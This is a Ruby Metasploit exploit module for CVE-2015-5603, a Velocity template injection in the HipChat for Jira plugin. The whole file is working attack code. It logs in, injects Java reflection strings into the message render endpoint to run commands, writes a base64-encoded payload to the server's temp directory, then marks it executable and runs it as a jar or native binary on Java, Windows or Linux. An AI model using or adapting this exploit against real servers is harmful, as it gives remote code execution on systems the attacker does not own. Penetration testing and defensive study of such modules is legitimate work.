##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'json'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper

  def initialize(info={})
    super(update_info(info,
      'Name'           => "Atlassian HipChat for Jira Plugin Velocity Template Injection",
      'Description'    => %q{
        Atlassian Hipchat is a web service for internal instant messaging. A plugin is available
        for Jira that allows team collibration at real time. A message can be used to inject Java
        code into a Velocity template, and gain code exeuction as Jira. Authentication is required
        to exploit this vulnerability, and you must make sure the account you're using isn't
        protected by captcha. By default, Java payload will be used because it is cross-platform,
        but you can also specify which native payload you want (Linux or Windows).

        HipChat for Jira plugin versions between 1.3.2 and 6.30.0 are affected. Jira versions
        between 6.3.5 and 6.4.10 are also affected by default, because they were bundled with
        a vulnerable copy of HipChat.

        When using the check command, if you supply a valid username and password, the module
        will be able to trigger the bug and check more accurately. If not, it falls back to
        passive, which can only tell if the target is running on a Jira version that is bundled
        with a vulnerable copy of Hipchat by default, which is less reliable.

        This vulnerability was originally discovered internally by Atlassian.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Chris Wood', # PoC
          'sinn3r'      # Metasploit
        ],
      'References'     =>
        [
          [ 'CVE', '2015-5603' ],
          [ 'EDB', '38551' ],
          [ 'BID', '76698' ],
          [ 'URL', 'https://confluence.atlassian.com/jira/jira-and-hipchat-for-jira-plugin-security-advisory-2015-08-26-776650785.html' ]
        ],
      'Targets'        =>
        [
          [ 'HipChat for Jira plugin on Java',    { 'Platform' => 'java',  'Arch' => ARCH_JAVA }],
          [ 'HipChat for Jira plugin on Windows', { 'Platform' => 'win',   'Arch' => ARCH_X86  }],
          [ 'HipChat for Jira plugin on Linux',   { 'Platform' => 'linux', 'Arch' => ARCH_X86  }]
        ],
      'DefaultOptions' =>
        {
          'RPORT' => 8080
        },
      'Privileged'     => false,
      'DisclosureDate' => 'Oct 28 2015',
      'DefaultTarget'  => 0
    ))

    register_options(
      [
        # Auth is required, but when we use the check command we allow them to be optional.
        OptString.new('JIRAUSER', [false, 'Jira Username', '']),
        OptString.new('JIRAPASS', [false, 'Jira Password', '']),
        OptString.new('TARGETURI', [true, 'The base to Jira', '/'])
      ], self.class)
  end


  # Returns a cookie in a hash, so you can ask for a specific parameter.
  #
  # @return [Hash]
  def get_cookie_as_hash(cookie)
    Hash[*cookie.scan(/\s?([^, ;]+?)=([^, ;]*?)[;,]/).flatten]
  end


  # Checks the target by actually triggering the bug.
  #
  # @return [Array] Exploit::CheckCode::Vulnerable if bug was triggered.
  #                 Exploit::CheckCode::Unknown if something failed.
  #                 Exploit::CheckCode::Safe for the rest.
  def do_explicit_check
    begin
      cookie = do_login
      # I don't really care which command to execute, as long as it's a valid one for both platforms.
      # If the command is valid, it should return {"message"=>"0"}.
      # If the command is not valid, it should return an empty hash.
      c = get_exec_code('whoami')
      res = inject_template(c, cookie)
      json = res.get_json_document
      if json['message'] && json['message'] == '0'
        return Exploit::CheckCode::Vulnerable
      end
    rescue Msf::Exploit::Failed => e
      vprint_error(e.message)
      return Exploit::CheckCode::Unknown
    end

    Exploit::CheckCode::Safe
  end


  # Returns the Jira version
  #
  # @return [String] Found Jira version
  # @return [NilClass] No Jira version found.
  def get_jira_version
    version = nil

    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'secure', 'Dashboard.jspa')
    })

    unless res
      vprint_error('Connection timed out while retrieving the Jira version.')
      return version
    end

    metas = res.get_html_meta_elements

    version_element = metas.select { |m|
      m.attributes['name'] && m.attributes['name'].value == 'ajs-version-number'
    }.first

    unless version_element
      vprint_error('Unable to find the Jira version.')
      return version
    end

    version_element.attributes['content'] ? version_element.attributes['content'].value : nil
  end


  # Checks the target by looking at things like the Jira version, or whether the Jira web app
  # exists or not.
  #
  # @return [Array] Check code. If the Jira version matches the vulnerable range, it returns
  #                 Exploit::CheckCode::Appears. If we can only tell it runs on Jira, we return
  #                 Exploit::CheckCode::Detected, because it's possible to have Jira not bundled
  #                 with HipChat by default, but installed separately. For other scenarios, we
  #                 return Safe.
  def do_passive_check
    jira_version = get_jira_version
    vprint_status("Found Jira version: #{jira_version}")
    if jira_version && jira_version >= '6.3.5' && jira_version < '6.4.11'
      return Exploit::CheckCode::Appears
    else
      return Exploit::CheckCode::Detected
    end

    Exploit::CheckCode::Safe
  end


  # Checks the vulnerability. Username and password are required to be able to accurately verify
  # the vuln. If supplied, we will try the explicit check (which will trigger the bug, so should
  # be more reliable). If not, we will try the passive one (less accurately, but better than
  # nothing).
  #
  # @see #do_explicit_check
  # @see #do_passive_check
  #
  # @return [Array] Check code
  def check
    checkcode = Exploit::CheckCode::Safe

    if jira_cred_empty?
      vprint_status("No username and password supplied, so we can only do a passive check.")
      checkcode = do_passive_check
    else
      checkcode = do_explicit_check
    end

    checkcode
  end


  # Returns the Jira username set by the user
  def jira_username
    datastore['JIRAUSER']
  end


  # Returns the Jira password set by the user
  def jira_password
    datastore['JIRAPASS']
  end


  # Reports username and password to the database.
  #
  # @param opts [Hash]
  # @option opts [String] :user
  # @option opts [String] :password
  #
  # @return [void]
  def report_cred(opts)
    service_data = {
      address: rhost,
      port: rport,
      service_name: ssl ? 'https' : 'http',
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      module_fullname: fullname,
      post_reference_name: self.refname,
      private_data: opts[:password],
      origin_type: :service,
      private_type: :password,
      username: opts[:user]
    }.merge(service_data)

    login_data = {
      core: create_credential(credential_data),
      status: Metasploit::Model::Login::Status::SUCCESSFUL,
      last_attempted_at: Time.now
    }.merge(service_data)

    create_credential_login(login_data)
  end


  # Returns a valid login cookie.
  #
  # @return [String]
  def do_login
    cookie = ''

    prerequisites = get_login_prerequisites
    xsrf          = prerequisites['atlassian.xsrf.token']
    sid           = prerequisites['JSESSIONID']
    uri           = normalize_uri(target_uri.path, 'rest', 'gadget', '1.0', 'login')

    res = send_request_cgi({
      'method'    => 'POST',
      'uri'       => uri,
      'headers'   => { 'X-Requested-With' => 'XMLHttpRequest' },
      'cookie'    => "atlassian.xsrf.token=#{xsrf}; JSESSIONID=#{sid}",
      'vars_post' => {
        'os_username' => jira_username,
        'os_password' => jira_password,
        'os_captcha'  => '' # Not beatable yet
      }
    })

    unless res
      fail_with(Failure::Unknown, 'Connection timed out while trying to login')
    end

    json = res.get_json_document

    if json.empty?
      fail_with(Failure::Unknown, 'Server returned a non-JSon response while trying to login.')
    end

    if json['loginSucceeded']
      cookie = res.get_cookies
    elsif !json['loginSucceeded'] && json['captchaFailure']
      fail_with(Failure::NoAccess, "#{jira_username} is protected by captcha. Please try a different account.")
    elsif !json['loginSucceeded']
      fail_with(Failure::NoAccess, 'Incorrect username or password')
    end

    report_cred(
      user: jira_username,
      password: jira_password
    )

    cookie
  end


  # Returns login prerequisites
  #
  # @return [Hash]
  def get_login_prerequisites
    uri = normalize_uri(target_uri.path, 'secure', 'Dashboard.jspa')
    res = send_request_cgi({ 'uri' => uri })

    unless res
      fail_with(Failure::Unknown, 'Connection timed out while getting login prerequisites')
    end

    get_cookie_as_hash(res.get_cookies)
  end


  # Returns the target platform.
  #
  # @param cookie [String] Jira cookie
  # @return [String]
  def get_target_platform(cookie)
    c = get_os_detection_code
    res = inject_template(c, cookie)
    json = res.get_json_document
    json['message'] || ''
  end


  # Returns Java code that can be used to inject to the template in order to write a file.
  #
  # @note This Java code is not able to properly close the file handle. So after using it, you should use #get_dup_file_code,
  #       and then execute the new file instead.
  #
  # @param fname [String] File to write to.
  # @param p [String] Payload
  # @return [String]
  def get_write_file_code(fname, p)
    b64 = Rex::Text.encode_base64(p)
    %Q| $i18n.getClass().forName('java.io.FileOutputStream').getConstructor($i18n.getClass().forName('java.lang.String')).newInstance('#{fname}').write($i18n.getClass().forName('sun.misc.BASE64Decoder').getConstructor(null).newInstance(null).decodeBuffer('#{b64}')) |
  end


  # Returns the Java code that gives us the remote Java home path.
  #
  # @return [String]
  def get_java_path_code
    get_java_property_code('java.home')
  end


  # Returns the OS/platform information.
  #
  # @return [String]
  def get_os_detection_code
    get_java_property_code('os.name')
  end


  # Returns the temp path for Java.
  #
  # @return [String]
  def get_temp_path_code
    get_java_property_code('java.io.tmpdir')
  end


  # Returns a system property for Java.
  #
  # @param prop [String] Name of the property to retrieve.
  # @return [String]
  def get_java_property_code(prop)
    %Q| $i18n.getClass().forName('java.lang.System').getMethod('getProperty', $i18n.getClass().forName('java.lang.String')).invoke(null, '#{prop}').toString() |
  end


  # Returns the Java code to execute a jar file.
  #
  # @param java_path [String] Java home path
  # @param war_path [String] The jar file to execute
  # @return [String]
  def get_jar_exec_code(java_path, war_path)
    # A quick way to check platform instead of actually grabbing os.name in Java system properties.
    if /^\/[[:print:]]+/ === war_path
      normalized_java_path = Rex::FileUtils.normalize_unix_path(java_path, '/bin/java')
      cmd_str = %Q|#{normalized_java_path} -jar #{war_path}|
    else
      normalized_java_path = Rex::FileUtils.normalize_win_path(java_path, '\\bin\\java.exe')
      war_path.gsub!(/Program Files/, 'PROGRA~1')
      cmd_str = %Q|cmd.exe /C #{normalized_java_path} -jar #{war_path}"|
    end

    %Q| $i18n.getClass().forName('java.lang.Runtime').getMethod('getRuntime', null).invoke(null, null).exec('#{cmd_str}').waitFor() |
  end


  # Returns Java code that can be used to inject to the template in order to execute a file.
  #
  # @param cmd [String] command to execute
  # @return [String]
  def get_exec_code(cmd)
    %Q| $i18n.getClass().forName('java.lang.Runtime').getMethod('getRuntime', null).invoke(null, null).exec('#{cmd}').waitFor() |
  end


  # Returns Java code that can be used to inject to the template in order to chmod a file.
  #
  # @param fname [String] File to chmod
  # @return [String]
  def get_chmod_code(fname)
    get_exec_code("chmod 777 #{fname}")
  end


  # Returns Java code that can be used to inject to the template in order to copy a file.
  #
  # @note The purpose of this method is to have a file that is not busy, so we can execute it.
  #       It is meant to be used with #get_write_file_code.
  #
  # @param fname [String] The file to copy
  # @param new_fname [String] The new file
  # @return [String]
  def get_dup_file_code(fname, new_fname)
    if fname =~ /^\/[[:print:]]+/
      cp_cmd = "cp #{fname} #{new_fname}"
    else
      cp_cmd = "cmd.exe /C copy #{fname} #{new_fname}"
    end

    get_exec_code(cp_cmd)
  end


  # Returns a boolean indicating whether the module has a username and password.
  #
  # @return [TrueClass] There is an empty cred.
  # @return [FalseClass] No empty cred.
  def jira_cred_empty?
    jira_username.blank? || jira_password.blank?
  end


  # Injects Java code to the template.
  #
  # @param p [String] Code that is being injected.
  # @param cookie [String] A cookie that contains a valid JSESSIONID
  # @return [void]
  def inject_template(p, cookie)
    login_sid = get_cookie_as_hash(cookie)['JSESSIONID']

    uri  = normalize_uri(target_uri.path, 'rest', 'hipchat', 'integrations', '1.0', 'message', 'render')
    uri << '/'

    res = send_request_cgi({
      'method' => 'POST',
      'uri' => uri,
      'cookie' => "JSESSIONID=#{login_sid}",
      'ctype'  => 'application/json',
      'data'   => { 'message' => p }.to_json
    })

    if !res
      # This seems to trigger every time even though we're getting a shell. So let's downplay
      # this a little bit. At least it's logged to allow the user to debug.
      elog('Connection timed out in #inject_template')
    elsif res && /Error report/ === res.body
      print_error('Failed to inject and execute code:')
      vprint_line(res.body)
    elsif res
      vprint_status("Server response:")
      vprint_line res.body
    end

    res
  end


  # Checks if the target os/platform is compatible with the module target or not.
  #
  # @return [TrueClass] Compatible
  # @return [FalseClass] Not compatible
  def target_platform_compat?(target_platform)
    target.platform.names.each do |n|
      if /^java$/i === n || /#{n}/i === target_platform
        return true
      end
    end

    false
  end


  # Returns the normalized file path for payload.
  #
  # @return [String]
  def normalize_payload_fname(tmp_path, fname)
    # A quick way to check platform insteaf of actually grabbing os.name in Java system properties.
    if /^\/[[:print:]]+/ === tmp_path
      Rex::FileUtils.normalize_unix_path(tmp_path, fname)
    else
      Rex::FileUtils.normalize_win_path(tmp_path, fname)
    end
  end


  # Returns a temp path from the remote target.
  #
  # @param cookie [String] Jira cookie
  # @return [String]
  def get_tmp_path(cookie)
    c = get_temp_path_code
    res = inject_template(c, cookie)
    json = res.get_json_document
    json['message'] || ''
  end


  # Returns the Java home path used by Jira.
  #
  # @param cookie [String] Jira cookie.
  # @return [String]
  def get_java_home_path(cookie)
    c = get_java_path_code
    res = inject_template(c, cookie)
    json = res.get_json_document
    json['message'] || ''
  end


  # Exploits the target in Java platform.
  #
  # @return [void]
  def exploit_as_java(cookie)
    tmp_path = get_tmp_path(cookie)

    if tmp_path.blank?
      fail_with(Failure::Unknown, 'Unable to get the temp path.')
    end

    jar_fname = normalize_payload_fname(tmp_path, "#{Rex::Text.rand_text_alpha(5)}.jar")
    jar       = payload.encoded_jar
    java_home = get_java_home_path(cookie)
    register_files_for_cleanup(jar_fname)

    if java_home.blank?
      fail_with(Failure::Unknown, 'Unable to find java home path on the remote machine.')
    else
      print_status("Found Java home path: #{java_home}")
    end

    print_status("Attempting to write #{jar_fname}")
    c = get_write_file_code(jar_fname, jar)
    inject_template(c, cookie)

    print_status("Executing #{jar_fname}")
    c = get_jar_exec_code(java_home, jar_fname)
    inject_template(c, cookie)
  end


  # Exploits the target in Windows platform.
  #
  # @return [void]
  def exploit_as_windows(cookie)
    tmp_path = get_tmp_path(cookie)

    if tmp_path.blank?
      fail_with(Failure::Unknown, 'Unable to get the temp path.')
    end

    exe           = generate_payload_exe(code: payload.encoded, arch: target.arch, platform: target.platform)
    exe_fname     = normalize_payload_fname(tmp_path,"#{Rex::Text.rand_text_alpha(5)}.exe")
    exe_new_fname = normalize_payload_fname(tmp_path,"#{Rex::Text.rand_text_alpha(5)}.exe")
    exe_fname.gsub!(/Program Files/, 'PROGRA~1')
    exe_new_fname.gsub!(/Program Files/, 'PROGRA~1')
    register_files_for_cleanup(exe_fname, exe_new_fname)

    print_status("Attempting to write #{exe_fname}")
    c = get_write_file_code(exe_fname, exe)
    inject_template(c, cookie)

    print_status("New file will be #{exe_new_fname}")
    c = get_dup_file_code(exe_fname, exe_new_fname)
    inject_template(c, cookie)

    print_status("Executing #{exe_new_fname}")
    c = get_exec_code(exe_new_fname)
    inject_template(c, cookie)
  end


  # Exploits the target in Linux platform.
  #
  # @return [void]
  def exploit_as_linux(cookie)
    tmp_path = get_tmp_path(cookie)

    if tmp_path.blank?
      fail_with(Failure::Unknown, 'Unable to get the temp path.')
    end

    fname = normalize_payload_fname(tmp_path, Rex::Text.rand_text_alpha(5))
    new_fname = normalize_payload_fname(tmp_path, Rex::Text.rand_text_alpha(6))
    register_files_for_cleanup(fname, new_fname)

    print_status("Attempting to write #{fname}")
    p = generate_payload_exe(code: payload.encoded, arch: target.arch, platform: target.platform)
    c = get_write_file_code(fname, p)
    inject_template(c, cookie)

    print_status("chmod +x #{fname}")
    c = get_exec_code("chmod 777 #{fname}")
    inject_template(c, cookie)

    print_status("New file will be #{new_fname}")
    c = get_dup_file_code(fname, new_fname)
    inject_template(c, cookie)

    print_status("Executing #{new_fname}")
    c = get_exec_code(new_fname)
    inject_template(c, cookie)
  end


  def exploit
    if jira_cred_empty?
      fail_with(Failure::BadConfig, 'Jira username and password are required.')
    end

    print_status("Attempting to login as #{jira_username}:#{jira_password}")
    cookie = do_login
    print_good("Successfully logged in as #{jira_username}")

    target_platform = get_target_platform(cookie)
    print_status("Target being detected as: #{target_platform}")

    unless target_platform_compat?(target_platform)
      fail_with(Failure::BadConfig, 'Selected module target does not match the actual target.')
    end

    case target.name
    when /java$/i
      exploit_as_java(cookie)
    when /windows$/i
      exploit_as_windows(cookie)
    when /linux$/i
      exploit_as_linux(cookie)
    end

  end

  def print_status(msg='')
    super("#{peer} - #{msg}")
  end

  def print_good(msg='')
    super("#{peer} - #{msg}")
  end

  def print_error(msg='')
    super("#{peer} - #{msg}")
  end

end